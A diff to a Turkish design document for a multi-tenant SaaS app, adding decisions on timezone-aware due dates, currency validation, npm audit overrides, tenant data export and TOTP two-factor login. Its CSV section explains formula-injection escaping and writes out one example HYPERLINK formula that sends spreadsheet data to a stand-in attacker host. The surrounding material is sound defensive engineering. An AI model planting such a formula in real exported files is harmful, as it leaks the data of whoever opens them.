@@ -2277,7 +2277,50 @@ kontrollerinin ikinci bir kopyasını doğururdu.
 - **Kısmi ödeme yok** (yukarıdaki `PARTIAL` gerekçesi).
 - **Karşı taraf serbest metindir**; kişi/kurum rehberi (`Contact`) ayrı bir kavram ve ayrı bir
   issue.
-- **Saat dilimi yok (#134)** — vade ve "bugün" karşılaştırması UTC.
+- **Vade karşılaştırması artık TENANT'IN saat dilimine göre** (#134). "Bugün",
+  `startOfTodayInTimeZone(tenant.timeZone)` ile hesaplanır. Önceki hâli UTC'nin gününü
+  kullanıyordu: UTC+3'te gece yarısını geçmiş bir tenant için o gün vadesi dolan kayıtlar
+  "henüz gecikmedi" görünüyordu — gecikme rozeti bir gün geç yanıyordu.
+
+  **`dueDate` bilerek saat dilimine ÇEVRİLMEZ.** O bir AN değil, TARİH-ONLY bir değerdir ve UTC
+  gece yarısı olarak saklanır; bir saat diliminde "yorumlamak" günü UTC'nin gerisindeki
+  dilimlerde bir gün geriye kaydırırdı. Yani `occurredAt` için doğru olan şey burada yanlış
+  olurdu. Karşılaştırmanın iki tarafı da tarih-only kalır.
+
+## Tahsilat: para birimi doğrulaması iki yerde iki katılıkta (Issue #205)
+
+Kayda geçmiş, **bilinçli** bir tutarsızlık.
+
+| Yer | Doğrulama |
+| --- | --- |
+| `Account.currency` | **Biçimsel** — üç büyük harf. `prisma/schema.prisma` gerekçesi: "tam ISO listesi bir bağımlılık gerektirir." |
+| `src/lib/collections/validation.ts` | **ICU listesi** — `Intl.supportedValuesOf("currency")` |
+
+**Şemadaki gerekçe artık geçerli değil.** `Intl.supportedValuesOf("currency")` ISO 4217 listesini
+**bağımlılık eklemeden** veriyor ve liste, tzdata gibi platformla birlikte güncelleniyor —
+`src/lib/time/tenant-time.ts`'in IANA saat dilimlerini elle tutulan bir allowlist yerine `Intl`e
+sorma kararıyla aynı duruş.
+
+### Karar: tahsilat tarafı gevşetilmedi
+
+Reddedilen alternatifler:
+
+- **Tahsilatı biçimsel doğrulamaya indirmek.** Çalışan ve daha sıkı bir kontrolü, yalnızca başka
+  bir yerdeki daha zayıf kontrole benzesin diye zayıflatmak olurdu. Tutarlılık, doğruluğun önüne
+  geçmez.
+- **`Account` tarafını da ICU listesine çekmek.** Doğru yön, ama bu bir **davranış
+  değişikliğidir**: bugün kabul edilen `"XYZ"` gibi kodlar reddedilmeye başlar ve mevcut kayıtlar
+  etkilenebilir. #205'in kapsamı "yorum ve gerekçe" işiydi; davranış değiştiren bir adım oraya
+  sığmaz.
+
+**Yön belli, adım ayrı:** hizalama kendi issue'sunda yapılır ve şemadaki eskimiş gerekçe orada
+güncellenir. Bu bölüm, o adıma kadar tutarsızlığın **sebebini** kayda geçirir — bilinmeyen bir
+tutarsızlık ile kayda geçmiş bir tutarsızlık aynı şey değildir.
+
+**Kalan risk:** iki ekran aynı alana farklı katılıkta davranıyor. Bir kullanıcı hesabına
+`"XYZ"` para birimi yazabiliyor ama o para biriminde bir ödeme planı kuramıyor. Bugün görünür
+bir etkisi yok (para birimi ekranlarda seçim listesinden gelmiyor, elle yazılıyor ve pratikte
+`TRY` kullanılıyor), ama hizalama yapılana kadar bu fark duruyor.
 
 ## Modül sistemi — çekirdek (Issue #151)
 
@@ -3082,6 +3125,37 @@ Job `npm ci` **çalıştırmaz**: `npm audit` `package-lock.json`'dan çalışı
 kopyalanmış boş bir dizinde aynı raporu üretti). Kurulum eklemek işi dakikalarca uzatır,
 taramaya hiçbir şey katmaz.
 
+#### Üç advisory `overrides` ile kapatıldı (Issue #227)
+
+Yukarıdaki ölçüm, advisory'lerin **çalıştırılan koda ulaşmadığını** gösteriyordu; ama "ulaşmıyor"
+ile "yok" aynı şey değildir. Üçünün de tek bir kökü vardı — `deepmerge-ts@7.1.5` — ve o kök
+`package.json`'daki bir `overrides` girdisiyle kaldırıldı:
+
+```json
+"overrides": { "deepmerge-ts": "^8.0.2" }
+```
+
+`npm audit` artık **sıfır** bulgu raporluyor (`--omit=dev` ile de, onsuz da).
+
+**Neden `overrides`, neden diğerleri değil:**
+
+- **Prisma'yı düşürmek** (`npm audit fix --force` → `prisma@6.12.0`) reddedildi: 6.19.3'ten
+  kırıcı bir geri adım ve `@prisma/config` API'si bu sürümde değişti.
+- **Eşiği `high`'a çekmek** bu değişikliğin konusu DEĞİLDİR (aşağıya bakın).
+- **Beklemek** — Prisma'nın kendi bağımlılığını yükseltmesini beklemek — bugün elde edilebilir
+  bir sonucu belirsiz bir tarihe erteliyordu.
+
+**Kalan risk — `overrides` bir zorlamadır.** `@prisma/config` `deepmerge-ts@^7` ilan ediyor;
+npm'e 8'i vermesini biz söylüyoruz, yani upstream'in desteklemediği bir bileşim kuruyoruz.
+Bu yüzden zorlama **varsayılmadı, koşuldu**: `prisma validate`, `generate`, `migrate status`,
+`migrate deploy` ve `format` komutlarının hepsi çalıştırıldı, ardından altı doğrulamanın tamamı
+(lint, typecheck, build, integration, security, e2e) yeşil koştu. Prisma CLI'ın bir sonraki
+yükseltmesinde bu girdinin **hâlâ gerekli olup olmadığı** yeniden bakılmalıdır: gereksiz kalmış
+bir `overrides` girdisi, sessizce eski bir sürümü sabitleyen bir tuzağa dönüşebilir.
+
+`integration/dependency-audit.spec.ts` bu girdiyi ve lock dosyasındaki çözülmüş sürümü koruma
+altına alır — biri `overrides`'ı düşürürse test kırmızıya döner.
+
 #### KABUL EDİLEN KALAN RİSK
 
 Eşik `critical` olduğu için, ileride kod yolunda **gerçekten bulunan** yüksek seviyeli bir
@@ -3089,8 +3163,12 @@ açık da **CI'ı kırmayacaktır.** Bu, bu kararın bedelidir ve küçümsenmiy
 
 Karşı önlemler — üçü birlikte, biri eksikse risk kabul edilebilir değildir:
 
-1. **Takip issue'su zorunludur ve açık tutulur** — **#227**. Üç advisory'nin durumu orada izlenir; Prisma
-   `deepmerge-ts@^8`'e geçtiği anda eşik **`high`'a çekilir**.
+1. **Takip issue'su zorunludur ve açık tutulur** — **#227**. Üç advisory'nin kendisi artık
+   kapalıdır (yukarıdaki `overrides`), ama **eşik bilinçli olarak `critical` kalmaya devam
+   ediyor**: eşiği `high`'a çekmek AYRI bir karardır ve bu değişikliğin kapsamında değildir.
+   Zincirdeki advisory'yi kapatmak ile "hangi seviyede CI kırılsın" sorusunu yanıtlamak farklı
+   iki sorudur; ikincisi, ağaçtaki her yüksek seviyeli bulgunun kapıyı kapatmasını kabul etmek
+   demektir ve gürültü maliyeti ölçülmeden verilemez. #227 o karar verilene kadar açık kalır.
 2. **Audit çıktısı her sürümde okunur.** Job yeşil olsa da çıktısı bilgi taşır; "yeşil" onu
    okumamanın gerekçesi değildir.
 3. **Bağımlılık taraması tek başına yetmez** — bu, ayrı ve daha genel bir karar olarak zaten
@@ -3375,6 +3453,142 @@ kabul kriterinin doğrulanabilir yarısıdır.
 - **`jwt` callback sorgusu değiştirilmedi.** Issue açıkça bunu şart koşuyordu; bağlantı
   yönetimi o sorguyu ucuzlatmaz, yalnızca yükünü taşınabilir kılar.
 
+## Tenant verisini dışa aktarma (Issue #194)
+
+"Verim bende kalır mı?" satış görüşmesinde sorulan bir sorudur; KVKK kapsamında veri
+taşınabilirliği ise bir haktır. Bugüne kadar bir tenant'ın verisini dışarı almanın hiçbir
+yolu yoktu.
+
+### Bağımlılık eklenmedi: CSV ve ZIP elle yazıldı
+
+CSV'nin zor kısmı alıntılama değil, aşağıdaki **formül enjeksiyonu** korumasıdır — ve bu bir
+CSV kütüphanesinin sorumluluğu değildir, çoğu yapmaz. ZIP'in ihtiyacımız olan kısmı ise
+küçüktür: yerel başlık + deflate + merkezî dizin; sıkıştırma zaten Node'da (`zlib`).
+
+**ZIP yazıcı gerçek araçlara karşı doğrulandı**, kendi okuyucumuza karşı değil: .NET
+`ZipFile` ve Windows `Expand-Archive` ile açıldı. Bu, geliştirme sırasında gerçek bir hatayı
+yakaladı — merkezî dizin girdilerinde **dosya adı yazılmıyordu** ve arşiv her araca **boş**
+görünüyordu. Kendi yazdığımız okuyucuyla test etseydik bu hata geçerdi.
+
+Bilinen sınırlar: **ZIP64 yok** (4 GB / 65535 dosya üstü), şifreleme yok. Sınırlar aşılırsa
+sessizce bozuk dosya üretmek yerine **fırlatılır**.
+
+### CSV formül enjeksiyonu
+
+`=`, `+`, `-`, `@` (ve sekme/satır başı) ile başlayan hücreleri Excel **formül** olarak
+çalıştırır. Kullanıcı bir kategoriye `=HYPERLINK("http://kotu.site?d="&A1,"Tıkla")` adını
+verirse, dosyayı açan kişi tıkladığında tablodaki veri saldırgana gider.
+
+**Bu bizim sorumluluğumuzdur**: dosyayı biz üretiyoruz ve bizim kullanıcımız açıyor.
+"Excel'in sorunu" demek, kendi ürettiğimiz dosyayı silah yapmak olurdu.
+
+Kaçırma **tek tırnakla** yapılır, silmeyle değil: Excel baştaki `'` karakterini "metin olarak ele
+al" direktifi sayar ve göstermez. Karakteri silmek veriyi bozardı — eksi işaretiyle başlayan
+meşru bir açıklama ("-500 düzeltmesi") sessizce değişirdi. Kaçırma **alıntılamadan önce**
+yapılır; tersi, eklenen tırnağı alıntının dışında bırakıp ayrıştırmayı bozardı.
+
+### Para STRING olarak yazılır
+
+`Decimal` → `Number` çevrimi kayan nokta yuvarlamasıdır (invariant #10). Ama asıl tehlike
+Excel'dedir: `1234.5600` hücresini sayıya çevirip sondaki sıfırları atar, büyük değerleri
+bilimsel gösterime kaydırır ve 15 basamaktan sonra **hassasiyet kaybeder**. Metin olarak
+yazılan değer, aktarıldığı andaki tam değeri taşır.
+
+Dosyalar **BOM'lu UTF-8** ve **CRLF**'tir: BOM olmadan Excel dosyayı sistem kod sayfasıyla
+açar ve Türkçe karakterler bozulur ("Kırtasiye" → "KÄ±rtasiye"). Standart ayrıştırıcılar
+BOM'u yok sayar, yani "hem Excel'de açılır hem makine okur" şartının ikisi de sağlanır.
+
+### Tenant izolasyonu: en kritik nokta
+
+`src/lib/export/tenant-data.ts` içindeki **her** sorgu `tenantScoped()` üzerinden geçer
+(invariant #1). Bir dışa aktarma dosyasına sızan tek bir yabancı satır, en kötü sınıftan bir
+ihlaldir: kalıcı bir dosyaya yazılır, kullanıcıya teslim edilir ve **geri alınamaz**.
+
+Testi bir **kontrol grubu** taşır: başka tenant'ın kimlikleri dosyada yok, ama kendi verisi
+**var** — aksi halde "boş dosya" da testi geçerdi.
+
+### Hangi alanlar dışarı çıkmaz
+
+Üye satırında e-posta, ad, rol ve katılma zamanı **vardır** (tenant'ın verisidir).
+`passwordHash`, `credentialsChangedAt`, `sessionsRevokedAt`, `emailVerified` **yoktur**: ilki bir
+sırdır, diğerleri kullanıcının GÜVENLİK durumudur ve tenant'ın verisi değildir — bir tenant
+sahibinin, üyesinin şifresini ne zaman değiştirdiğini öğrenmesi için hiçbir gerekçe yoktur.
+Davetlerde `tokenHash` de yoktur.
+
+Bunlar `include` ile değil **dar `select`** ile sağlanır: `include: { user: true }` yazmak,
+şemaya eklenecek her yeni kullanıcı alanını sessizce dosyaya taşırdı.
+
+### Üretim eşzamanlı değildir
+
+Büyük bir tenant'ta ZIP üretimi HTTP zaman aşımını aşar. İstek `PENDING` bir kayıt bırakır ve
+`202` döner; üretimi `POST /api/maintenance/data-exports` yapar — **#188'in getirdiği
+"platform cron'u bir bakım ucunu çağırır" deseninin aynısı**. Bu repo'da kuyruk altyapısı
+yoktur ve bir tane getirmek bu issue'nun kapsamı dışıdır.
+
+İş **atomik olarak sahiplenilir** (`PENDING → PROCESSING` koşullu `updateMany`): eşzamanlı iki
+bakım çağrısında aynı işi yalnızca biri alır. Dosya önce `.tmp`, sonra `rename` ile yazılır —
+yarıda kesilen bir iş, "hazır" sanılıp indirilebilecek yarım bir ZIP bırakmamalıdır.
+
+Aynı tenant için aynı anda **birden fazla bekleyen talep olamaz** (`409`): arka arkaya basılan
+bir düğme, aynı veriyi üreten onlarca iş ve onlarca kalıcı dosya bırakırdı.
+
+### 🔴 İndirme bir POST'tur — invariant gerilimi burada çözüldü
+
+Issue iki şey istiyordu: indirme bağlantısı **tek kullanımlık** olsun ve invariant #6'nın
+token desenine uysun. Ama tek kullanımlık olmak `downloadedAt`'i yazmak, yani bir **yan etki**
+demektir. Bunu bir GET'e koymak **invariant #4'ü** ("GET/HEAD yan etkisizdir") ihlal ederdi ve
+`integration/get-side-effect-free-pattern.spec.ts` haklı olarak kırmızıya dönerdi.
+
+**İnvariant gevşetilmedi; biçim değiştirildi.** İndirme `POST /api/exports/download`'dur.
+Kaybedilen tek şey adres çubuğuna yapıştırılabilen bir bağlantıdır; kazanılan şey hem tek
+kullanımlılık hem de yan etkisiz GET kuralının bozulmamasıdır.
+
+**Token gövdededir, URL'de değil:** URL'ler sunucu erişim loglarına, proxy loglarına ve
+tarayıcı geçmişine yazılır. Tenant'ın tüm verisini açan bir anahtarın oralarda durmaması
+gerekir.
+
+Uç **kimlik istemez** — token'ın kendisi yetkidir (şifre sıfırlama linkiyle aynı model);
+talebi yapan OWNER dosyayı başka bir cihazda açabilmelidir.
+
+"Bulunamadı" / "süresi doldu" / "zaten indirildi" **ayrıştırılmaz**, hepsi `404` (invariant #7).
+`409` yalnızca henüz hazır olmayan iş içindir ve bu bir sızıntı değildir: o token'ı yalnızca
+talebi yapan bilir ve "hazır mı" sorusunun cevabını görmesi akışın kendisidir.
+
+### Yetki OWNER-only
+
+Yeni izin `tenant:export`, `modules:manage` ve `tenant:update-settings` ile **aynı sınıfta**:
+dışa aktarma tenant'ın tüm verisini — üye e-postaları ve audit log dahil — tek bir dosyada
+dışarı çıkarır. Bir ADMIN'in günlük operasyon yetkisi bunu kapsamaz; bu bir **sahiplik**
+kararıdır.
+
+Rate limit `tenant:data-export` **2/saat**: üretim pahalıdır ve her çalışma kalıcı bir dosya
+bırakır. Sınırsız bırakmak, çalınmış bir OWNER oturumuyla diski doldurmanın ve aynı veriyi
+tekrar tekrar dışarı taşımanın yolu olurdu.
+
+### Audit: `TENANT_DATA_EXPORTED`
+
+Olay **indirme anında** yazılır, talep anında değil — veri asıl orada dışarı çıkar.
+"Veri sızdı mı, ne zaman, kim tarafından" sorusunun cevabı budur.
+
+Süresi dolan dosyalar silinir ama **kayıt korunur**: dosya diskte durmamalıdır, ama "ne zaman,
+kim tarafından dışa aktarıldı" bir audit sorusudur.
+
+### Kalan risk / kapsam dışı
+
+- **Arayüz yok.** Issue'nun kapsam listesinde UI maddesi yoktu; akış bugün yalnızca API
+  üzerinden kullanılabilir.
+- **Dosyalar YEREL DİSKTE.** `TENANT_EXPORT_DIR` ile yer değiştirilebilir, ama nesne deposuna
+  taşımak **#185**'in konusudur ve o hesap erişimi bekliyor. Bu dizin web sunucusu tarafından
+  **servis edilmemelidir**.
+- **Zamanlanmış iş kurulmadı** — `MAINTENANCE_SECRET`'ın ortama konmasını ve bir cron
+  tanımlanmasını gerektirir (#188 ile aynı durum).
+- **İçe aktarma yok** (Epic 10, #79). `manifest.json` `formatVersion` taşıyor ki o iş bu
+  biçimi okuyabilsin.
+- **Modül verisi genel değil:** bugün açık modüllerin kendi tabloları yok; `moduller.csv` hangi
+  modülün açık olduğunu taşır. CRM/Tahsilat modelleri geldiğinde bu dosya listesi genişletilmeli.
+- **Büyük tenant ölçülmedi:** ZIP tek seferde bellekte üretilir. Bugünkü veri boyutlarında
+  sorun değil, ama gigabaytlık bir tenant için akış (streaming) üretim gerekir.
+
 ## Yedekleme ve geri dönüş (Issue #185)
 
 > **RPO = 24 saat. RTO = 4 saat.**
@@ -3458,3 +3672,149 @@ Bu bölüm hedef durumu tarif eder. Aşağıdakiler **hesap erişimi** gerektird
   döküm alma, doğrulama ve rotasyon mantığı taklit bir `aws` CLI ile uçtan uca koşturuldu.
 - **"Hesabımı sil" akışı yok** — saklama tablosundaki "hesap silinene kadar" satırları bugün
   fiilen *süresiz* demektir. Ayrı bir issue gerekir.
+
+## İki faktörlü doğrulama — TOTP (Issue #193)
+
+Finansal veriye erişen bir üründe tek faktör yetmez: şifresi sızmış bir hesap, bu değişiklikten
+önce doğrudan tüm tenant verisine erişiyordu.
+
+### Bağımlılık eklenmedi
+
+RFC 6238'in tamamı bir HMAC ve bir sayaçtır; Node'un `crypto` modülü ikisini de veriyor.
+`src/lib/auth/totp.ts` base32 (RFC 4648), HOTP (RFC 4226) ve TOTP'yi içerir ve doğruluğu
+**spesifikasyonun kendi test vektörleriyle** kanıtlanır — kendi encode'umuzu kendi decode'umuzla
+okumak bir şey kanıtlamazdı.
+
+**SHA-1 kullanılıyor ve bu doğrudur.** SHA-1 çakışma saldırılarına karşı kırıktır, ama TOTP onu
+bir HMAC anahtarıyla, tek yönlü ve kısa ömürlü bir kod üretmek için kullanır; HMAC-SHA1'e karşı
+pratik bir saldırı yoktur. Daha önemlisi RFC 6238'in varsayılanıdır ve yaygın authenticator
+uygulamalarının **tamamı** bunu bekler. SHA-256'ya geçmek güvenliği ölçülebilir şekilde
+artırmaz, ama kullanıcıların bir kısmının uygulamasını bozar.
+
+### Sır HASH'LENMEZ, ŞİFRELENİR
+
+Şifreler ve token'lar tek yönlü hash'lenir çünkü doğrulama "aynı şeyi hash'le, karşılaştır" ile
+yapılır. TOTP'de bu **mümkün değildir**: kod, sırdan **hesaplanır**, yani sır doğrulama anında
+geri okunmak zorundadır.
+
+Yapılabilecek en iyi şey, DB dump'ı sızdığında sırların işe yaramaz olmasıdır: **AES-256-GCM**,
+anahtar `AUTH_SECRET`'ten **HKDF** ile türetilir. HKDF zorunludur çünkü `AUTH_SECRET` zaten
+JWT için kullanılıyor — aynı ham anahtar malzemesini iki kriptografik amaçla kullanmak, birindeki
+zayıflığı diğerine taşır (key separation).
+
+GCM tercih edildi çünkü **kimlik doğrulamalıdır**: DB'ye yazma erişimi olan biri ciphertext'i
+değiştirirse çözme başarısız olur. CBC bunu fark ettirmezdi.
+
+**NE KORUMAZ:** uygulama sunucusu ele geçirilirse `AUTH_SECRET` de saldırgandadır ve sırlar
+açılabilir. Bu, sunucuda çözülmesi gereken her sır için geçerli olan kaçınılmaz sınırdır ve
+kabul edilmiştir.
+
+### Üç adımlı kurulum: `confirmedAt` dolana kadar 2FA AKTİF DEĞİLDİR
+
+"Başlat → doğrula → aktif". Tek adımda aktifleştirmek, QR'ı okuyamamış ya da yanlış cihaza
+eklemiş bir kullanıcıyı **kendi hesabından kalıcı olarak kilitlerdi**.
+
+**Kurtarma kodları kurulumun BAŞINDA üretilir**, sonunda değil. Sonunda üretmek, "authenticator
+eklendi ama kurtarma kodu görülmedi" penceresi bırakırdı; o pencerede telefonunu kaybeden
+kullanıcı kilitlenir. 2FA, kurtarma kodları olmadan aktifleştirilemez.
+
+10 kod, her biri 16 karakter (~79 bit). Alfabede **`0/O` ve `1/I/L` yoktur**: kullanıcı bu
+kodu elle yazar ve görsel karışıklık, doğru kodun reddedilmesine yol açardı. DB'de yalnızca
+SHA-256 hash'leri durur ve tüketim **atomik koşullu `updateMany`** ile yapılır
+(`PasswordResetToken` ile aynı desen) — aynı kod eşzamanlı iki kez gönderilse bile yalnızca
+biri `count === 1` görür.
+
+### Replay: aynı kod ikinci kez kabul edilmez
+
+Bir TOTP kodu 30 saniye geçerlidir; o pencerede yakalanan bir kod aksi halde tekrar
+oynatılabilirdi. Son başarılı pencere `lastUsedStep` olarak saklanır ve karşılaştırma
+`<=` iledir — yalnızca "eşit"i engellemek, tolerans penceresi geçmişe de açık olduğu için
+bir önceki pencerenin kodunu oynatmaya izin verirdi.
+
+Yazma **koşulludur** (`lastUsedStep < step`): aynı kodla eşzamanlı iki giriş denemesinde
+yalnızca biri kazanır. "Önce oku, sonra yaz" bu yarışı açık bırakırdı.
+
+**Kurulum ve giriş aynı pencereyi paylaşır:** doğrulama başarılı olduğunda `confirmedAt` ile
+birlikte `lastUsedStep` de yazılır, yoksa kurulumda kullanılan kod hemen bir girişte tekrar
+kullanılabilirdi.
+
+**Tolerans ±1 penceredir.** Telefon saati kaymasını ve kodu yazma süresini karşılar. Daha geniş
+bir pencere, yakalanan bir kodun geçerlilik süresini ve aynı anda geçerli kod sayısını doğrudan
+büyütürdü.
+
+### Giriş akışı: Auth.js Credentials provider'ına entegrasyon
+
+Bu, akışın en kritik noktasıdır. Auth.js `authorize()`tan yalnızca `User | null` bekler ve
+`null` genel bir `CredentialsSignin` hatasına dönüşür. Bu **tek kanal**, "şifre yanlış" ile
+"şifre doğru ama kod gerekiyor" durumlarını ayırt edemez — ayırt edilmezse 2FA'lı bir kullanıcıya,
+**doğru şifresini girdiği hâlde** "şifreniz yanlış" denirdi.
+
+Çözüm `CredentialsSignin` alt sınıfı fırlatmaktır; `@auth/core` bu sınıfın `code` alanını
+yanıt URL'sine yazar. Ölçüldü: yanıt **302**'dir ve
+`location: /api/auth/signin?error=CredentialsSignin&code=totp_required` taşır.
+
+| Durum | `code` |
+| --- | --- |
+| Şifre yanlış / kullanıcı yok / şifresiz hesap | `credentials` |
+| Şifre doğru, 2FA aktif, kod gönderilmemiş | `totp_required` |
+| Şifre doğru, kod/kurtarma kodu yanlış | `totp_invalid` |
+
+**BU AYRIM BİR SIR SIZDIRMAZ.** `totp_required` ve `totp_invalid` yanıtlarına **yalnızca
+şifresi doğru** bir istekle ulaşılır. Şifreyi bilmeyen her zaman `credentials` alır; yani bu
+kod, hesabın 2FA kullandığını **zaten şifreyi bilen** birine söyler. `security/totp-security.spec.ts`
+bunu 2FA'lı ve 2FA'sız iki hesabı yanlış şifreyle karşılaştırarak kanıtlar.
+
+**Reddedilen alternatif — ayrı bir "bu hesap 2FA kullanıyor mu" endpoint'i:** kimliksiz
+çağrılabilen böyle bir uç, bir e-postanın kayıtlı olup olmadığını sızdıran bir oracle olurdu.
+
+**Sıra sabittir: şifre HER ZAMAN ikinci faktörden önce doğrulanır.** Tersi, ikinci faktörü
+şifreyi bilmeyen birine karşı da denenebilir kılar ve `AUTH_TOTP_FAILURE` kayıtlarını
+(aktörü bilinen olaylar olarak) anlamsızlaştırırdı.
+
+### `AUTH_LOGIN_SUCCESS` yalnızca HER İKİ faktör geçtiğinde yazılır
+
+Bu olay "bir oturum verildi" demektir. Şifresi doğru ama kodu yanlış bir denemeyi başarı saymak,
+audit log'u hiç var olmamış bir oturum hakkında yanıltırdı.
+
+`AUTH_TOTP_FAILURE` kaydında **aktör bilinir ve yazılır** — `AUTH_LOGIN_FAILURE`'ın aksine.
+Buraya yalnızca şifresi doğru bir istekle gelinir, dolayısıyla kayıt bir enumeration sinyali
+taşımaz. Arka arkaya gelen `AUTH_TOTP_FAILURE`, sızmış bir şifreyle ikinci faktörü kırma
+girişiminin en doğrudan göstergesidir.
+
+**Kodsuz ilk deneme FAILURE YAZMAZ:** o bir saldırı değil, akışın ikinci adımıdır. Yazsaydı her
+normal giriş bir "failure" üretir ve gerçek saldırı sinyali gürültüye boğulurdu.
+
+### Rate limit: `auth:totp`, 5/5dk
+
+Kod **yalnızca 6 hanedir** (10⁶) ve ±1 tolerans yüzünden her an **üç** kod geçerlidir. Şifrenin
+aksine bu, brute-force'un gerçekten uygulanabilir olduğu bir sırdır; `SIGNIN`'in 10/5dk'sı
+şifre için makul, ikinci faktör için fazla cömerttir.
+
+Kod taşıyan bir giriş isteği **iki sayacı birden** tüketir (`auth:sign-in` + `auth:totp`).
+Yalnızca TOTP bucket'ını uygulamak, kodu boş bırakıp `SIGNIN` limitini ayrı bir havuz gibi
+kullanmayı mümkün kılardı. Gövde, `handlers.POST`'a devretmeden önce bir **klondan** okunur —
+`request.formData()` gövdeyi tüketir ve her giriş sessizce başarısız olurdu.
+
+### 2FA kapatma MEVCUT ŞİFREYİ ister
+
+Kapatmak hesabın koruma seviyesini **düşüren** bir işlemdir. Çalınmış bir session cookie'si ile
+tek çağrıda kapatılabilseydi, 2FA'nın koruduğu şeyi 2FA'nın kendi kapatma ucundan aşmak mümkün
+olurdu. Aynı gerekçe `change-password` akışında da geçerlidir.
+
+Kapatma **kurtarma kodlarını da siler**: 2FA yeniden açıldığında, kullanıcının artık sakladığını
+sanmadığı eski kodların geçerli kalması bir arka kapı olurdu.
+
+### Kalan risk / kapsam dışı
+
+- **ARAYÜZ YOK.** Bu issue API katmanını kapsıyor (kapsam listesinde UI maddesi yok; bu repo'da
+  UI istenen issue'lar bunu "API + UI" diye yazar). Bugünkü giriş ekranı `totp` alanını
+  **göndermiyor**, dolayısıyla 2FA uçtan uca **kullanılabilir değil** — ayrı bir issue gerekir.
+- **QR kodu üretilmiyor.** `otpauth://` URI'si dönülüyor; onu QR'a çevirmek bir bağımlılık
+  ister ve bu, açık onay gerektiren bir karardır (CLAUDE.md § 4). Kullanıcı bugün sırrı elle
+  girebilir.
+- **Zaman kayması ölçülmedi.** ±1 pencere, saati ciddi biçimde kaymış bir cihazda yetmeyebilir;
+  bunun görünür bir teşhisi (ör. "cihazınızın saati doğru mu") yok.
+- **Sunucu ele geçirilirse sırlar açılabilir** (yukarıda). Donanım anahtarına (WebAuthn/passkey)
+  geçmek bunu çözer ve issue'da açıkça kapsam dışıdır.
+- **Tenant seviyesinde "2FA zorunlu" politikası yok** — issue'da kapsam dışı.
+- **SMS/e-posta OTP yok** — bilinçli: daha zayıf ve maliyetli.
